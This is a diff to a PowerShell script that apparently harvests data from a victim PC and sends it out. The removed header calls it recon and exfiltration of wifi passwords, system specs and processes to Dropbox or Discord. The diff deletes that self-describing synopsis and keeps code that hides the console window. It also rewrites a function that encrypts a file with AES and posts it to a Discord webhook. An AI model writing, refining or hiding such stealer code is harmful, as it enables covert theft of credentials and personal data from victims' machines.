@@ -1,20 +1,4 @@
-
-                                                                                                                                                                                                                                               
-<#
-.SYNOPSIS
-	This is an advanced recon of a target PC and exfiltration of that data.
-.DESCRIPTION 
-	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
-	All of the gather information is formatted neatly and output to a file.
-	That file is then exfiltrated to cloud storage via Dropbox.
-.Link
-      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
-      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
-      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
-#>
-
 ############################################################################################################################################################
-
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
@@ -510,8 +494,8 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 function Upload-Discord {
     [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$False)]
-        [string]$file,
+        [parameter(Position=0, Mandatory=$True)]
+        [string]$file,  # File to encrypt and send
         
         [parameter(Position=1, Mandatory=$True)]
         [string]$dc,  # Discord webhook URL
@@ -520,29 +504,15 @@ function Upload-Discord {
         [string]$keyBase64,  # AES Key in Base64 format
         
         [parameter(Position=3, Mandatory=$True)]
-        [string]$ivBase64,  # AES IV in Base64 format
-        
-        [parameter(Position=4, Mandatory=$False)]
-        [string]$text  # Optional message content
+        [string]$ivBase64  # AES IV in Base64 format
     )
 
     # Convert the Base64 key and IV into byte arrays
     $key = [System.Convert]::FromBase64String($keyBase64)
     $iv = [System.Convert]::FromBase64String($ivBase64)
 
-    $hookurl = $dc  # Removed unnecessary string conversion
-
-    # Initialize the request body for the webhook
-    $Body = @{
-        'username' = $env:username
-        'content' = $text
-    }
-
-    # Variable to track if we created an encrypted file
-    $encryptedFilePath = $null
-
     # Encrypt the file if it exists
-    if ($file -and (Test-Path $file)) {  # Added check for $file parameter
+    if (Test-Path $file) {
         try {
             # Create AES encryptor with the provided key and IV
             $aes = [System.Security.Cryptography.Aes]::Create()
@@ -565,25 +535,11 @@ function Upload-Discord {
         finally {
             if ($aes) { $aes.Dispose() }
         }
-    }
 
-    try {
-        # Send text content if provided
-        if (-not [string]::IsNullOrEmpty($text)) {
-            $jsonBody = $Body | ConvertTo-Json
-            $params = @{
-                Uri = $hookurl
-                Method = 'Post'
-                ContentType = 'Application/Json'
-                Body = $jsonBody
-            }
-            Invoke-RestMethod @params
-        }
-
-        # Send the encrypted file if it exists
-        if ($encryptedFilePath -and (Test-Path $encryptedFilePath)) {
+        # Upload the encrypted file to Discord
+        try {
             $fileParams = @{
-                Uri = $hookurl
+                Uri = $dc
                 Method = 'Post'
                 Form = @{
                     'file' = Get-Item -Path $encryptedFilePath
@@ -591,19 +547,20 @@ function Upload-Discord {
             }
             Invoke-RestMethod @fileParams
         }
-    }
-    catch {
-        Write-Error "Upload failed: $_"
-    }
-    finally {
-        # Cleanup temporary encrypted file
-        if ($encryptedFilePath -and (Test-Path $encryptedFilePath)) {
-            Remove-Item -Path $encryptedFilePath -Force
+        catch {
+            Write-Error "Upload failed: $_"
+        }
+        finally {
+            # Cleanup temporary encrypted file
+            if (Test-Path $encryptedFilePath) {
+                Remove-Item -Path $encryptedFilePath -Force
+            }
         }
     }
+    else {
+        Write-Error "File not found: $file"
+    }
 }
-
- 
 
 ############################################################################################################################################################
 
